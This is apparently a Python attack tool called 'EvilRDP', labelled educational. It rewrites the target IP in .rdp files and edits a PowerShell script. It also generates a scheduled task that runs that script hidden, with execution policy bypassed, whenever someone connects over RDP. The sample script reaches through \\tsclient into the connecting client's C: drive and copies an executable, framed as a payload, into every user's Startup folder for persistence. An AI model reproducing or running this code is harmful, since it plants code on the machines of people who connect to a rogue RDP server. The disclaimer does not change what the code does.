import argparse
import sys
import os
from pathlib import Path

# Color support for cross-platform compatibility
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    # Fallback if colorama is not installed
    COLORS_AVAILABLE = False
    class Fore:
        RED = GREEN = BLUE = YELLOW = CYAN = MAGENTA = WHITE = RESET = ''
    class Style:
        BRIGHT = RESET_ALL = ''

# Color helper functions
def print_success(msg):
    """Print success message in green"""
    print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")

def print_error(msg):
    """Print error message in red"""
    print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")

def print_warning(msg):
    """Print warning message in yellow"""
    print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")

def print_info(msg):
    """Print info message in blue"""
    print(f"{Fore.BLUE}[*] {msg}{Style.RESET_ALL}")

def print_header(msg):
    """Print header message in cyan"""
    print(f"{Fore.CYAN}{Style.BRIGHT}{'='*60}")
    print(f"{msg}")
    print(f"{'='*60}{Style.RESET_ALL}")


def modify_rdp_file(rdp_path, new_ip):
    """
    Modify the IP address in an RDP file
    
    Args:
        rdp_path: Path to the .rdp file
        new_ip: New IP address to set
    """
    import shutil
    import time
    
    # Create backup first
    backup_path = rdp_path + '.backup'
    try:
        shutil.copy2(rdp_path, backup_path)
        print_info(f"Created backup: {backup_path}")
    except Exception as e:
        print_warning(f"Could not create backup: {e}")
    
    # Read the file
    encoding_used = 'utf-16-le'
    try:
        with open(rdp_path, 'r', encoding='utf-16-le') as f:
            content = f.read()
    except UnicodeDecodeError:
        # Try UTF-8 if UTF-16 fails
        try:
            with open(rdp_path, 'r', encoding='utf-8') as f:
                content = f.read()
            encoding_used = 'utf-8'
        except Exception as e:
            print_error(f"Error reading file: {e}")
            raise
    except PermissionError:
        print_error(f"Permission denied reading '{rdp_path}'")
        print_error("Make sure the file is not open in another program")
        raise
    
    # Replace the IP address
    lines = content.split('\n')
    modified_lines = []
    
    for line in lines:
        if line.startswith('full address:s:'):
            modified_lines.append(f'full address:s:{new_ip}')
            print_success(f"Updated IP address to: {Fore.CYAN}{new_ip}{Style.RESET_ALL}")
        else:
            modified_lines.append(line)
    
    modified_content = '\n'.join(modified_lines)
    
    # Try to write back to file with retry logic
    max_retries = 3
    for attempt in range(max_retries):
        try:
            # Write to a temporary file first
            temp_path = rdp_path + '.tmp'
            with open(temp_path, 'w', encoding=encoding_used) as f:
                f.write(modified_content)
            
            # If successful, replace the original file
            if os.path.exists(rdp_path):
                os.remove(rdp_path)
            os.rename(temp_path, rdp_path)
            
            print_success(f"Successfully modified RDP file: {Fore.CYAN}{rdp_path}{Style.RESET_ALL}")
            
            # Remove backup if successful
            try:
                if os.path.exists(backup_path):
                    os.remove(backup_path)
                    print_info("Removed backup file")
            except:
                pass
            
            return
            
        except PermissionError as e:
            if attempt < max_retries - 1:
                print_warning(f"Permission denied (attempt {attempt + 1}/{max_retries}). Retrying in 1 second...")
                time.sleep(1)
            else:
                print_error(f"Permission denied writing to '{rdp_path}'")
                print_error("The file may be:")
                print(f"    {Fore.RED}- Open in Remote Desktop Connection")
                print(f"    - Locked by another program")
                print(f"    - In a protected directory{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}[*] Solutions:{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}1. Close all programs using this file")
                print(f"    2. Run this script as Administrator")
                print(f"    3. Copy the file to a different location{Style.RESET_ALL}")
                if os.path.exists(backup_path):
                    print_info(f"Backup file available at: {backup_path}")
                raise
        except Exception as e:
            print_error(f"Unexpected error: {e}")
            if os.path.exists(backup_path):
                print_info(f"Backup file available at: {backup_path}")
            raise


def modify_powershell_script(ps1_path, new_file_path):
    """
    Modify the file path in a PowerShell script
    
    Args:
        ps1_path: Path to the .ps1 file
        new_file_path: New file path to use in the script
    """
    import shutil
    import time
    
    # Create backup first
    backup_path = ps1_path + '.backup'
    try:
        shutil.copy2(ps1_path, backup_path)
        print_info(f"Created backup: {backup_path}")
    except Exception as e:
        print_warning(f"Could not create backup: {e}")
    
    # Read the file
    try:
        with open(ps1_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except PermissionError:
        print_error(f"Permission denied reading '{ps1_path}'")
        print_error("Make sure the file is not open in another program")
        raise
    
    # Find and replace the Copy-Item line with the new file path
    lines = content.split('\n')
    modified_lines = []
    
    for line in lines:
        if 'Copy-Item -Path' in line and '-Destination' in line:
            # Extract the current file path
            if '"C:\\Users\\admin\\Downloads\\Hacking\\RDP-Exploit\\putty.exe"' in line:
                old_path = '"C:\\Users\\admin\\Downloads\\Hacking\\RDP-Exploit\\putty.exe"'
            else:
                # Try to extract path between quotes after -Path
                import re
                match = re.search(r'-Path\s+"([^"]+)"', line)
                if match:
                    old_path = f'"{match.group(1)}"'
                else:
                    old_path = None
            
            if old_path:
                # Replace with new path, ensuring proper escaping
                new_path_escaped = new_file_path.replace('\\', '\\\\')
                modified_line = line.replace(old_path, f'"{new_path_escaped}"')
                modified_lines.append(modified_line)
                print_success(f"Updated file path from {Fore.YELLOW}{old_path}{Fore.GREEN} to {Fore.CYAN}\"{new_path_escaped}\"{Style.RESET_ALL}")
            else:
                modified_lines.append(line)
        else:
            modified_lines.append(line)
    
    modified_content = '\n'.join(modified_lines)
    
    # Try to write back to file with retry logic
    max_retries = 3
    for attempt in range(max_retries):
        try:
            # Write to a temporary file first
            temp_path = ps1_path + '.tmp'
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(modified_content)
            
            # If successful, replace the original file
            if os.path.exists(ps1_path):
                os.remove(ps1_path)
            os.rename(temp_path, ps1_path)
            
            print_success(f"Successfully modified PowerShell script: {Fore.CYAN}{ps1_path}{Style.RESET_ALL}")
            
            # Remove backup if successful
            try:
                if os.path.exists(backup_path):
                    os.remove(backup_path)
                    print_info("Removed backup file")
            except:
                pass
            
            return
            
        except PermissionError as e:
            if attempt < max_retries - 1:
                print_warning(f"Permission denied (attempt {attempt + 1}/{max_retries}). Retrying in 1 second...")
                time.sleep(1)
            else:
                print_error(f"Permission denied writing to '{ps1_path}'")
                print_error("The file may be:")
                print(f"    {Fore.RED}- Open in PowerShell ISE or another editor")
                print(f"    - Locked by another program")
                print(f"    - In a protected directory{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}[*] Solutions:{Style.RESET_ALL}")
                print(f"    {Fore.GREEN}1. Close all programs using this file")
                print(f"    2. Run this script as Administrator")
                print(f"    3. Copy the file to a different location{Style.RESET_ALL}")
                if os.path.exists(backup_path):
                    print_info(f"Backup file available at: {backup_path}")
                raise
        except Exception as e:
            print_error(f"Unexpected error: {e}")
            if os.path.exists(backup_path):
                print_info(f"Backup file available at: {backup_path}")
            raise


def create_scheduled_task_xml(output_path, ps1_script_path, username=None):
    """
    Create a scheduled task XML that triggers on RDP connection
    
    Args:
        output_path: Path where to save the XML file
        ps1_script_path: Full path to the PowerShell script to execute
        username: Optional username to run task as (defaults to current user)
    """
    import codecs
    import getpass
    
    # Get current username if not specified
    if username is None:
        username = getpass.getuser()
    
    # Escape the path for XML
    ps1_script_path_escaped = ps1_script_path.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
    
    # Note: No XML declaration in the content, we'll handle encoding with codecs
    task_xml = f"""<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-01-01T00:00:00.0000000</Date>
    <Author>{username}</Author>
    <Description>RDP Session Monitor Task</Description>
  </RegistrationInfo>
  <Triggers>
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <UserId>{username}</UserId>
      <StateChange>RemoteConnect</StateChange>
    </SessionStateChangeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{username}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File "{ps1_script_path_escaped}"</Arguments>
    </Exec>
  </Actions>
</Task>"""
    
    # Write with proper UTF-16-LE encoding with BOM for Windows Task Scheduler
    with codecs.open(output_path, 'w', encoding='utf-16-le') as f:
        # Write BOM manually
        f.write('\ufeff')
        # Write XML declaration
        f.write('<?xml version="1.0" encoding="UTF-16"?>\n')
        # Write the task XML
        f.write(task_xml)
    
    print_success(f"Created scheduled task XML: {Fore.CYAN}{output_path}{Style.RESET_ALL}")
    print_success(f"Task Name: {Fore.MAGENTA}EvilRDP{Style.RESET_ALL}")
    print_success(f"Run As User: {Fore.YELLOW}{username}{Style.RESET_ALL}")
    print_success(f"Run Level: {Fore.YELLOW}LeastPrivilege (Standard User){Style.RESET_ALL}")
    print_success(f"Logon Type: {Fore.YELLOW}InteractiveToken (Only when user is logged on){Style.RESET_ALL}")
    print_success(f"Trigger: {Fore.YELLOW}Remote RDP Connection for {username}{Style.RESET_ALL}")
    print_success(f"Action: Execute PowerShell script at {Fore.CYAN}{ps1_script_path}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[*] To import this task, run as Administrator:{Style.RESET_ALL}")
    print(f'    {Fore.GREEN}schtasks /create /tn "EvilRDP" /xml "{output_path}" /f{Style.RESET_ALL}')
    print(f"\n{Fore.YELLOW}[*] Note: Task will run as {username} with standard user privileges{Style.RESET_ALL}")


def create_sample_files(output_dir):
    """
    Create sample RDP and PowerShell files for testing
    
    Args:
        output_dir: Directory to create sample files in
    """
    rdp_content = """screen mode id:i:2
use multimon:i:0
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,3,0,0,800,600
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
remoteappmousemoveinject:i:1
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:192.168.50.132
audiomode:i:0
redirectprinters:i:1
redirectlocation:i:1
redirectcomports:i:1
redirectsmartcards:i:1
redirectwebauthn:i:1
redirectclipboard:i:1
redirectposdevices:i:0
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
enablerdsaadauth:i:0
camerastoredirect:s:*
devicestoredirect:s:*
drivestoredirect:s:*
"""

    ps1_content = """$Users = Get-ChildItem -Path "\\\\tsclient\\C\\Users" -Directory | Where-Object { $_.Name -notlike "Public" -and $_.Name -notlike "Default*" }
foreach ($User in $Users) {
    $StartupPath = "\\\\tsclient\\C\\Users\\$($User.Name)\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    Copy-Item -Path "C:\\Users\\admin\\Downloads\\Hacking\\RDP-Exploit\\putty.exe" -Destination $StartupPath -ErrorAction SilentlyContinue
}
"""

    os.makedirs(output_dir, exist_ok=True)
    
    rdp_file = os.path.join(output_dir, "sample.rdp")
    ps1_file = os.path.join(output_dir, "sample.ps1")
    task_xml_file = os.path.join(output_dir, "EvilRDP_Task.xml")
    
    with open(rdp_file, 'w', encoding='utf-8') as f:
        f.write(rdp_content)
    
    with open(ps1_file, 'w', encoding='utf-8') as f:
        f.write(ps1_content)
    
    # Create scheduled task XML pointing to the sample PS1 file
    create_scheduled_task_xml(task_xml_file, os.path.abspath(ps1_file))
    
    print(f"\n{Fore.GREEN}[+] Created sample files in: {Fore.CYAN}{output_dir}{Style.RESET_ALL}")
    print(f"    {Fore.YELLOW}- {rdp_file}")
    print(f"    - {ps1_file}")
    print(f"    - {task_xml_file}{Style.RESET_ALL}")


def main():
    # Print banner
    if COLORS_AVAILABLE:
        print(f"\n{Fore.CYAN}{Style.BRIGHT}{'='*60}")
        print(f"{Fore.RED}███████╗██╗   ██╗██╗██╗         ██████╗ ██████╗ ██████╗ ")
        print(f"██╔════╝██║   ██║██║██║         ██╔══██╗██╔══██╗██╔══██╗")
        print(f"█████╗  ██║   ██║██║██║         ██████╔╝██║  ██║██████╔╝")
        print(f"██╔══╝  ╚██╗ ██╔╝██║██║         ██╔══██╗██║  ██║██╔═══╝ ")
        print(f"███████╗ ╚████╔╝ ██║███████╗    ██║  ██║██████╔╝██║     ")
        print(f"╚══════╝  ╚═══╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═════╝ ╚═╝     ")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}    RDP Configuration Modifier - Educational Tool")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    parser = argparse.ArgumentParser(
        description='RDP Configuration Modifier - Educational security testing tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Modify RDP file with new IP
  python rdp_config_modifier.py --rdp-file config.rdp --ip 10.0.0.50
  
  # Modify PowerShell script with new file path
  python rdp_config_modifier.py --ps1-file script.ps1 --file-path "C:\\Tools\\payload.exe"
  
  # Create scheduled task XML (runs as current user)
  python rdp_config_modifier.py --create-task EvilRDP.xml --task-ps1-path "C:\\Scripts\\exploit.ps1"
  
  # Create scheduled task XML with specific username
  python rdp_config_modifier.py --create-task EvilRDP.xml --task-ps1-path "C:\\Scripts\\exploit.ps1" --username "admin"
  
  # Modify both files and create scheduled task
  python rdp_config_modifier.py --rdp-file config.rdp --ip 10.0.0.50 \\
                                 --ps1-file script.ps1 --file-path "C:\\Tools\\payload.exe" \\
                                 --create-task EvilRDP.xml --task-ps1-path "C:\\Scripts\\exploit.ps1"
  
  # Create sample files for testing
  python rdp_config_modifier.py --create-samples ./test_files
        """
    )
    
    parser.add_argument('--rdp-file', type=str, help='Path to the .rdp file to modify')
    parser.add_argument('--ip', type=str, help='New IP address for RDP connection')
    parser.add_argument('--ps1-file', type=str, help='Path to the .ps1 PowerShell script to modify')
    parser.add_argument('--file-path', type=str, help='New file path to use in PowerShell script')
    parser.add_argument('--create-task', type=str, metavar='XML_FILE', 
                       help='Create scheduled task XML file (requires --task-ps1-path)')
    parser.add_argument('--task-ps1-path', type=str, 
                       help='Full path to PowerShell script for scheduled task (e.g., "C:\\Scripts\\script.ps1")')
    parser.add_argument('--username', type=str, 
                       help='Username to run scheduled task as (defaults to current user)')
    parser.add_argument('--create-samples', type=str, metavar='DIR', 
                       help='Create sample RDP and PS1 files in specified directory')
    
    args = parser.parse_args()
    
    # Check if no arguments provided
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)
    
    # Handle sample file creation
    if args.create_samples:
        create_sample_files(args.create_samples)
        return
    
    # Validate RDP modification arguments
    if args.rdp_file and not args.ip:
        print_error("--ip is required when using --rdp-file")
        sys.exit(1)
    
    if args.ip and not args.rdp_file:
        print_error("--rdp-file is required when using --ip")
        sys.exit(1)
    
    # Validate PS1 modification arguments
    if args.ps1_file and not args.file_path:
        print_error("--file-path is required when using --ps1-file")
        sys.exit(1)
    
    if args.file_path and not args.ps1_file:
        print_error("--ps1-file is required when using --file-path")
        sys.exit(1)
    
    # Validate scheduled task arguments
    if args.create_task and not args.task_ps1_path:
        print_error("--task-ps1-path is required when using --create-task")
        sys.exit(1)
    
    if args.task_ps1_path and not args.create_task:
        print_error("--create-task is required when using --task-ps1-path")
        sys.exit(1)
    
    # Perform RDP file modification
    if args.rdp_file and args.ip:
        if not os.path.exists(args.rdp_file):
            print_error(f"RDP file not found: {args.rdp_file}")
            sys.exit(1)
        
        print_info("Modifying RDP file...")
        modify_rdp_file(args.rdp_file, args.ip)
    
    # Perform PowerShell script modification
    if args.ps1_file and args.file_path:
        if not os.path.exists(args.ps1_file):
            print_error(f"PowerShell script not found: {args.ps1_file}")
            sys.exit(1)
        
        print(f"\n")
        print_info("Modifying PowerShell script...")
        modify_powershell_script(args.ps1_file, args.file_path)
    
    # Create scheduled task XML
    if args.create_task and args.task_ps1_path:
        print(f"\n")
        print_info("Creating scheduled task XML...")
        create_scheduled_task_xml(args.create_task, args.task_ps1_path, args.username)
    
    print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] All modifications completed successfully!{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}[!] WARNING: This tool is for educational purposes only.")
    print(f"[!] Only use in authorized lab environments with proper permissions.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()